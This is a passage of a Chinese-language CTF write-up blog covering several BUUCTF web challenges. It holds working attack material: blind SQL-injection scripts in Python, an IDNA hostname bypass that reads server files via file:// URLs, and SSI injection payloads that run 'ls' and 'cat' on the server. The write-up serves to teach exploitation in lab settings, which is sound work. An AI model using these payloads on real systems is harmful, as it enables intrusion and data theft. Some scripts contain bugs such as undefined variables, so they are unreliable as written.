secret)asd;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">2</span>    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5678</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> a <span class="keyword">from</span>(<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">as</span> a,<span class="number">3</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> secret)qw;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span> a    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> <span class="number">5678</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+</span></span><br><span class="line"></span><br><span class="line">过滤了<span class="keyword">order</span>的时候，可以用<span class="keyword">group</span> <span class="keyword">by</span> 来测试有多少行</span><br><span class="line">单引号闭合，正常闭合会出错的话，可以,<span class="string">&#x27;2。这样闭合</span></span><br><span class="line"><span class="string">无列名注入</span></span><br><span class="line"><span class="string">一般都有limit 0,1的限制，可用group_concat()来将数据弄到一行中去</span></span><br><span class="line"><span class="string">空格用/**/内敛注释绕过</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>



<h2 id="7-SUCTF-2019-Pythonginx"><a href="#7-SUCTF-2019-Pythonginx" class="headerlink" title="7.[SUCTF 2019]Pythonginx"></a>7.[SUCTF 2019]Pythonginx</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">@app.route(<span class="string">&#x27;/getUrl&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]) </span><br><span class="line">def getUrl(): </span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>) </span><br><span class="line">    host = parse.urlparse(url).hostname  <span class="comment">#解析主机名</span></span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 111&quot;</span> </span><br><span class="line">    parts = <span class="keyword">list</span>(urlsplit(url)) </span><br><span class="line">    host = parts[<span class="number">1</span>] </span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 222 &quot;</span> + host </span><br><span class="line">    newhost = [] </span><br><span class="line">    <span class="keyword">for</span> h in host.split(<span class="string">&#x27;.&#x27;</span>): </span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>)) </span><br><span class="line">        parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost) <span class="comment">#去掉 url 中的空格 </span></span><br><span class="line">        finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>] <span class="comment"># 将主机名再次组合成 url</span></span><br><span class="line">        host = parse.urlparse(finalUrl).hostname </span><br><span class="line">        <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>: </span><br><span class="line">            <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read() </span><br><span class="line">        <span class="keyword">else</span>: </span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;我扌 your problem? 333&quot;</span> </span><br></pre></td></tr></table></figure>

<p>前两个 if 判断 host是否含有 suctf.cc 如果有就报错，经过 utf-8 解码 idna 编码 之后传入到 urlunsplit函数 组合成url ，再用 if 和suctf.cc进行一次比较 如果相同 就 进行读取。</p>
<p>我们先了解下 idna<br>idna 国际化域名应用，国际化域名(Internationalized Domain Name,IDN)又名特殊字符域名，是指部分或完全使用特殊文字或字母组成的互联网域名，包括中文、发育、阿拉伯语、希伯来语或拉丁字母等非英文字母，这些文字经过多字节万国码编码而成。在域名系统中，国际化域名使用punycode转写并以<br>ASCII字符串存储。<br>.<br>℆这个字符,如果使用python3进行idna编码的话<br>print(‘℆’.encode(‘idna’))<br>结果<br>b’c/u’<br>如果再使用utf-8进行解码的话<br>print(b’c/u’.decode(‘utf-8’))<br>结果<br>c/u<br>通过这种方法可以绕过本题</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nginx目录：</span><br><span class="line">配置文件存放目录：/etc/<span class="attribute">nginx</span></span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getUrl?url=file://suctf.c℆sr/local/nginx/conf/nginx.conf</span><br><span class="line">得到：</span><br><span class="line">server &#123; listen 80; location / &#123; try_files $uri @app; &#125; location @app &#123; include uwsgi_params; uwsgi_pass unix:///tmp/uwsgi.sock; &#125; location /static &#123; alias /app/static; &#125; # location /flag &#123; # alias /usr/fffffflag; # &#125; &#125;</span><br><span class="line"></span><br><span class="line">getUrl?url=file://suctf.c℆sr/fffffflag</span><br><span class="line">得到：</span><br><span class="line">flag&#123;2baa12f7-2b11-4be9-8e94-1a34b2b50ecf&#125;</span><br></pre></td></tr></table></figure>

<h2 id="8-极客大挑战-2019-FinalSQL"><a href="#8-极客大挑战-2019-FinalSQL" class="headerlink" title="8.[极客大挑战 2019]FinalSQL"></a>8.[极客大挑战 2019]FinalSQL</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://34779a2c-91f2-4ce2-b412-8c76e1bdb4bb.node4.buuoj.cn:81/search.php?id=&#x27;</span></span><br><span class="line">dblen = <span class="string">&#x27;1^(length(database())=&#x27;</span>   <span class="comment"># final 4</span></span><br><span class="line"></span><br><span class="line">dbname = <span class="string">&#x27;1^(ascii(substr(database(),&#x27;</span>  <span class="comment">#geek</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">5</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">123</span>):</span><br><span class="line">        finurl = url+dbname+<span class="built_in">str</span>(i)+url1+<span class="built_in">str</span>(j)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        req = requests.get(finurl)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            name = name+<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tblen = <span class="string">&#x27;1^((select(length(group_concat(TABLE_NAME)))from(information_schema.tables)where(table_schema=&quot;geek&quot;))=i)&#x27;</span></span><br><span class="line"><span class="comment">#i=16</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    finurl = url+tblen+<span class="built_in">str</span>(i)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">    req = requests.get(finurl)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">tbname = <span class="string">&#x27;1^(ascii(substr(select(group_concat(table_name))&#x27;</span> \</span><br><span class="line">        <span class="string">&#x27;from(information_schema.tables)where(table_schema=&quot;dbname&quot;),i,1))=j)&#x27;</span></span><br><span class="line"><span class="comment">#F1naI1y,Flaaaaag</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">17</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">123</span>):</span><br><span class="line">        finurl = url+tbname+<span class="built_in">str</span>(i)+url1+<span class="built_in">str</span>(j)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        req = requests.get(finurl)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            name = name+<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">colulen = <span class="string">&#x27;1^((select(length(group_concat(COLUMN_NAME)))&#x27;</span> \</span><br><span class="line">          <span class="string">&#x27;from(information_schema.columns)where(table_name=&quot;tbname&quot;))=i)&#x27;</span></span><br><span class="line"><span class="comment">#Flaaaaag 11 F1naI1y20</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    finurl = url+colulen+<span class="built_in">str</span>(i)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">    req = requests.get(finurl)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">coluname = <span class="string">&#x27;1^(ascii(substr(select(group_concat(column_name))&#x27;</span> \</span><br><span class="line">           <span class="string">&#x27;from(information_schema.columns)where(table_name=&quot;tbname&quot;),i,1))=j)&#x27;</span></span><br><span class="line"><span class="comment">#Flaaaaag--id,fl4gawsl</span></span><br><span class="line"><span class="comment">#F1naI1y--id,username,password</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">123</span>):</span><br><span class="line">        finurl = url+coluname+<span class="built_in">str</span>(i)+url1+<span class="built_in">str</span>(j)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        req = requests.get(finurl)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            name = name+<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">valulen = <span class="string">&#x27;1^((select(length(group_concat(coluname)))from(tbname))=213)&#x27;</span></span><br><span class="line"><span class="comment">#213</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">300</span>):</span><br><span class="line">    finurl = url+valulen+<span class="built_in">str</span>(i)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">    req = requests.get(finurl)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">value = <span class="string">&#x27;1^(ascii(substr((select(group_concat(coluname))from(tbname)),i,1))=j)&#x27;</span></span><br><span class="line"><span class="comment">#cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.tmp,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_nee[_a_grilfriend,flag&#123;dc63a59b-0dc1-4fdb-86cf-9d8411048989&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#flag&#123;dc63a59b-0dc1-4fdb-86cf-9d8411048989&#125;</span></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line">url1 = <span class="string">&#x27;,1))=&#x27;</span></span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">171</span>,<span class="number">214</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        finurl = url+value+<span class="built_in">str</span>(i)+url1+<span class="built_in">str</span>(j)+<span class="string">&#x27;)&#x27;</span></span><br><span class="line">        req = requests.get(finurl)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ERROR&#x27;</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            name = name+<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line"><span class="comment">#for循环跑的好慢好慢，需要用------二分法，快的一批</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://34779a2c-91f2-4ce2-b412-8c76e1bdb4bb.node4.buuoj.cn:81/search.php&quot;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        <span class="comment"># 中间的语句为真，网页不报错，中间的语句为假，网页报错，根据这个判断</span></span><br><span class="line">        <span class="comment"># 查数据库</span></span><br><span class="line">        database = <span class="string">&quot;?id=1^(ord(substr((select(database())),%d,1))&gt;%d)^1&quot;</span> % (i, mid)</span><br><span class="line">        <span class="comment"># 查表</span></span><br><span class="line">        tables = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">        columns = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;</span>%(i,j)</span><br><span class="line">        data = <span class="string">&quot;?id=1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)</span><br><span class="line">        <span class="comment"># 根据需要查询的内容改变get中的参数</span></span><br><span class="line">        r = requests.get(url=url+database)</span><br><span class="line">        <span class="comment"># print(url+database)</span></span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(r.raw)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Click&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">        <span class="comment"># print(low,mid,high)</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(low)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="9-BJDCTF2020-EasySearch"><a href="#9-BJDCTF2020-EasySearch" class="headerlink" title="9.[BJDCTF2020]EasySearch"></a>9.[BJDCTF2020]EasySearch</h2><p>在首界面审查源代码、抓包未获取到有效信息，就开始进行目录扫描，获取到index.php.swp文件，结果如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python 跑出来一个</span></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000000</span>):</span><br><span class="line">    md5 = hashlib.md5(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> md5[<span class="number">0</span>:<span class="number">6</span>] == <span class="string">&#x27;6d0bc1&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;success!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        </span><br><span class="line"><span class="built_in">hash</span>.digest() ：返回摘要，作为二进制数据字符串值</span><br><span class="line"><span class="built_in">hash</span>.hexdigest()：返回摘要，作为十六进制数据字符串值</span><br><span class="line">hashlib.md5(<span class="string">&#x27;2020666&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))：</span><br><span class="line">    &lt;md5 HASH <span class="built_in">object</span> @ <span class="number">0x000001DAE7237DD0</span>&gt;</span><br><span class="line"></span><br><span class="line">hashlib.md5(<span class="string">&#x27;2020666&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()：</span><br><span class="line">	6d0bc1153791aa2b4e18b4f344f26ab4</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们观察到页面需要显示：      </p>
<p>SSI 注入全称Server-Side Includes Injection（服务端包含注入），ssi可以赋予html静态页面的动态效果，通过ssi执行命令，返回对应的结果，当在网站目录中发现了.stm .shtm .shtml或在界面中发现了就容易产生ssi注入，此处问题的其注入格式为：<!--#exec cmd="命令" --></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/seizer/p/17035775.html">SSI学习</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello,&#x27;.$_POST[&#x27;username&#x27;].&#x27;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;所以这里存在一个注入点&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;$what&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>Welcome, &#123;&#123;username&#125;&#125;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&#123;%$a%&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">payload:    </span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;命令&quot; --&gt;</span></span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;ls&quot; --&gt;</span></span><br><span class="line">    Hello,052f5d5cb988c12c5054146e8e62133793164e04.shtml 277daf029727c9cbe7acc31d7840353a65fc8e9f.shtml 2b88015534a75975d2f8f95ba084719b8274e017.shtml 2dc1b67c1009e4a8f9d9af70f3d875eb15d94e87.shtml</span><br><span class="line">    ……………………………………</span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;ls ../&quot; --&gt;</span></span><br><span class="line">    Hello,flag_990c66bf85a09c664f0b6741840499b2 index.php index.php.swp public</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--#exec cmd=&quot;cat ../flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;</span></span><br><span class="line">	Hello,flag&#123;865df233-2a82-48be-b90c-8d87005a8007&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="10-0CTF-2016-piapiapia"><a href="#10-0CTF-2016-piapiapia" class="headerlink" title="10.[0CTF 2016]piapiapia"></a>10.[0CTF 2016]piapiapia</h2><p>search扫描发现有一个<a href="http://www.zip的压缩包，下载下来后有：index.php">www.zip的压缩包，下载下来后有：index.php</a> register.php config.php update.php profile.php class.php</p>
<p>注意到只有config.php里面包含有flag的信息，所以我们需要想办法将其文件包含出来</p>
